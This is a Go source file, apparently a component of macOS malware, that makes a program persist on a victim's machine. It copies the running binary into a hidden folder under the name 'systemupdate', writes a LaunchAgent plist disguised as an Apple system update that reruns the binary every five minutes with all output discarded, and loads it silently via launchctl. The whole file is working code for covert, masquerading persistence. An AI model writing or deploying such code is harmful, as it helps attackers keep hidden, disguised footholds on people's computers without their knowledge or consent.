package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const (
	hiddenDir  = "Library/Containers/.cache"
	binaryName = "systemupdate"
	plistName  = "com.apple.system.update.plist"
)

// Install copies the current binary to a hidden location, writes a LaunchAgent
// plist, and loads it via launchctl. If already running from the hidden path,
// it returns immediately to avoid redundant installation.
func Install() error {
	home, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	exe, err := os.Executable()
	if err != nil {
		return err
	}

	hiddenPath := filepath.Join(home, hiddenDir)
	binaryPath := filepath.Join(hiddenPath, binaryName)
	plistPath := filepath.Join(home, "Library/LaunchAgents", plistName)

	// Already running from the persisted location
	if strings.Contains(exe, hiddenPath) {
		return nil
	}

	// Ensure hidden directory exists
	if err := os.MkdirAll(hiddenPath, 0755); err != nil {
		return err
	}

	// Copy binary to hidden location
	data, err := os.ReadFile(exe)
	if err != nil {
		return err
	}
	if err := os.WriteFile(binaryPath, data, 0755); err != nil {
		return err
	}

	// Write LaunchAgent plist
	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>`, plistName, binaryPath)

	if err := os.MkdirAll(filepath.Dir(plistPath), 0755); err != nil {
		return err
	}
	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return err
	}

	// Load the LaunchAgent
	cmd := exec.Command("launchctl", "load", "-w", plistPath)
	return cmd.Run()
}
